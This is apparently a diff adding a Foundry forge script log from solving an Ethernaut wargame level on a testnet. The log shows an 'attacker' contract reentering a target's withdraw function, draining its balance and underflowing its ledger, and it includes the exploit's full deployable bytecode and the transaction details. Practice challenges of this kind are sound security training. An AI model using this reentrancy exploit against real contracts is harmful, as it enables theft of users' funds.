@@ -1,0 +1,141 @@
+Compiling 1 files with Solc 0.6.12
+Solc 0.6.12 finished in 708.66ms
+Compiler run successful!
+Traces:
+  [439913] ethernaut9Script::run()
+    ├─ [0] VM::envUint("PRIVATE_KEY") [staticcall]
+    │   └─ ← [Return] <env var value>
+    ├─ [0] VM::startBroadcast(<pk>)
+    │   └─ ← [Return]
+    ├─ [301550] → new attacker@0x35edA28963065902984bFA2ADC49E47Bb599576a
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 0x000000000000000000000000ce65bda0af6b6f58f0df86ba57cf16156212d514
+    │   └─ ← [Return] 1042 bytes of code
+    ├─ [95384] attacker::attack()
+    │   ├─ [22526] 0xcE65Bda0AF6b6F58F0dF86ba57CF16156212D514::donate{value: 1000000000000000}(attacker: [0x35edA28963065902984bFA2ADC49E47Bb599576a])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xbe8f5aa53f1502e8dac822c43059f782f5e4b2aada5029cafca4f2930b8f9f8a: 0 → 0x00000000000000000000000000000000000000000000000000038d7ea4c68000
+    │   │   └─ ← [Stop]
+    │   ├─ [39489] 0xcE65Bda0AF6b6F58F0dF86ba57CF16156212D514::withdraw(1000000000000000 [1e15])
+    │   │   ├─ [11999] attacker::receive{value: 1000000000000000}()
+    │   │   │   ├─ [489] 0xcE65Bda0AF6b6F58F0dF86ba57CF16156212D514::balanceOf(attacker: [0x35edA28963065902984bFA2ADC49E47Bb599576a]) [staticcall]
+    │   │   │   │   └─ ← [Return] 1000000000000000 [1e15]
+    │   │   │   ├─ [489] 0xcE65Bda0AF6b6F58F0dF86ba57CF16156212D514::balanceOf(attacker: [0x35edA28963065902984bFA2ADC49E47Bb599576a]) [staticcall]
+    │   │   │   │   └─ ← [Return] 1000000000000000 [1e15]
+    │   │   │   ├─ [9017] 0xcE65Bda0AF6b6F58F0dF86ba57CF16156212D514::withdraw(1000000000000000 [1e15])
+    │   │   │   │   ├─ [1427] attacker::receive{value: 1000000000000000}()
+    │   │   │   │   │   ├─ [489] 0xcE65Bda0AF6b6F58F0dF86ba57CF16156212D514::balanceOf(attacker: [0x35edA28963065902984bFA2ADC49E47Bb599576a]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1000000000000000 [1e15]
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xbe8f5aa53f1502e8dac822c43059f782f5e4b2aada5029cafca4f2930b8f9f8a: 0x00000000000000000000000000000000000000000000000000038d7ea4c68000 → 0
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xbe8f5aa53f1502e8dac822c43059f782f5e4b2aada5029cafca4f2930b8f9f8a: 0 → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffc72815b398000
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Attacker Balance: ", 2000000000000000 [2e15]) [staticcall]
+    │   └─ ← [Revert] unknown selector `0x9710a9d0` for ConsoleCalls
+    ├─ [0] console::log("Instance Balance: ", 0) [staticcall]
+    │   └─ ← [Revert] unknown selector `0x9710a9d0` for ConsoleCalls
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+
+Script ran successfully.
+
+## Setting up 1 EVM.
+==========================
+Simulated On-chain Traces:
+
+  [230794] → new attacker@0x35edA28963065902984bFA2ADC49E47Bb599576a
+    ├─  storage changes:
+    │   @ 0: 0 → 0x000000000000000000000000ce65bda0af6b6f58f0df86ba57cf16156212d514
+    └─ ← [Return] 1042 bytes of code
+
+  [74320] attacker::attack()
+    ├─ [22526] 0xcE65Bda0AF6b6F58F0dF86ba57CF16156212D514::donate{value: 1000000000000000}(attacker: [0x35edA28963065902984bFA2ADC49E47Bb599576a])
+    │   ├─  storage changes:
+    │   │   @ 0xbe8f5aa53f1502e8dac822c43059f782f5e4b2aada5029cafca4f2930b8f9f8a: 0 → 0x00000000000000000000000000000000000000000000000000038d7ea4c68000
+    │   └─ ← [Stop]
+    ├─ [39489] 0xcE65Bda0AF6b6F58F0dF86ba57CF16156212D514::withdraw(1000000000000000 [1e15])
+    │   ├─ [11999] attacker::receive{value: 1000000000000000}()
+    │   │   ├─ [489] 0xcE65Bda0AF6b6F58F0dF86ba57CF16156212D514::balanceOf(attacker: [0x35edA28963065902984bFA2ADC49E47Bb599576a]) [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000 [1e15]
+    │   │   ├─ [489] 0xcE65Bda0AF6b6F58F0dF86ba57CF16156212D514::balanceOf(attacker: [0x35edA28963065902984bFA2ADC49E47Bb599576a]) [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000 [1e15]
+    │   │   ├─ [9017] 0xcE65Bda0AF6b6F58F0dF86ba57CF16156212D514::withdraw(1000000000000000 [1e15])
+    │   │   │   ├─ [1427] attacker::receive{value: 1000000000000000}()
+    │   │   │   │   ├─ [489] 0xcE65Bda0AF6b6F58F0dF86ba57CF16156212D514::balanceOf(attacker: [0x35edA28963065902984bFA2ADC49E47Bb599576a]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1000000000000000 [1e15]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xbe8f5aa53f1502e8dac822c43059f782f5e4b2aada5029cafca4f2930b8f9f8a: 0x00000000000000000000000000000000000000000000000000038d7ea4c68000 → 0
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Stop]
+    │   ├─  storage changes:
+    │   │   @ 0xbe8f5aa53f1502e8dac822c43059f782f5e4b2aada5029cafca4f2930b8f9f8a: 0 → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffc72815b398000
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+
+==========================
+
+Chain 421614
+
+Estimated max fee per gas: 0.062964001 gwei
+Estimated base fee per gas: 0.031482 gwei
+Estimated max priority fee per gas: 0.000000001 gwei
+
+Estimated total gas used for script: 424241
+
+Estimated amount required: 0.000026711910748241 ETH
+
+==========================
+
+=== Transactions that will be broadcast ===
+
+
+Chain 421614
+
+### Transaction 1 ###
+
+accessList           []
+chainId              421614
+gasLimit             396644
+gasPrice             
+input                0x608060405273ce65bda0af6b6f58f0df86ba57cf16156212d5146000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610412806100676000396000f3fe6080604052600436106100225760003560e01c80639e5faafc1461029657610291565b366102915766038d7ea4c6800060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060206040518083038186803b1580156100b657600080fd5b505afa1580156100ca573d6000803e3d6000fd5b505050506040513d60208110156100e057600080fd5b81019080805190602001909291905050501015801561013d575066038d7ea4c6800060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163110155b1561028f5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060206040518083038186803b15801561020557600080fd5b505afa158015610219573d6000803e3d6000fd5b505050506040513d602081101561022f57600080fd5b81019080805190602001909291905050506040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b15801561027657600080fd5b505af115801561028a573d6000803e3d6000fd5b505050505b005b600080fd5b61029e6102a0565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1662362a9566038d7ea4c68000306040518363ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1681526020019150506000604051808303818588803b15801561032f57600080fd5b505af1158015610343573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d66038d7ea4c680006040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b1580156103c257600080fd5b505af11580156103d6573d6000803e3d6000fd5b5050505056fea264697066735822122021d0c2a00b6b8177ce3dc56b3e374dd6415a746fa1673ed35ac4c7b910102dc664736f6c634300060c0033
+maxFeePerBlobGas     
+maxFeePerGas         
+maxPriorityFeePerGas 
+nonce                87
+to                   
+type                 EIP-1559
+value                1000000000000000
+
+### Transaction 2 ###
+
+accessList           []
+chainId              421614
+gasLimit             27597
+gasPrice             
+input                0x9e5faafc
+maxFeePerBlobGas     
+maxFeePerGas         
+maxPriorityFeePerGas 
+nonce                88
+to                   0x35edA28963065902984bFA2ADC49E47Bb599576a
+type                 EIP-1559
+value                0
+contract: attacker(0x35edA28963065902984bFA2ADC49E47Bb599576a)
+data (decoded): attack()
+
+
+SIMULATION COMPLETE. To broadcast these transactions, add --broadcast and wallet configuration(s) to the previous command. See forge script --help for more.
+
+Transactions saved to: /mnt/d/foundry/ethernaut challenges/broadcast/10.s.sol/421614/dry-run/run-latest.json
+
+Sensitive values saved to: /mnt/d/foundry/ethernaut challenges/cache/10.s.sol/421614/dry-run/run-latest.json
+
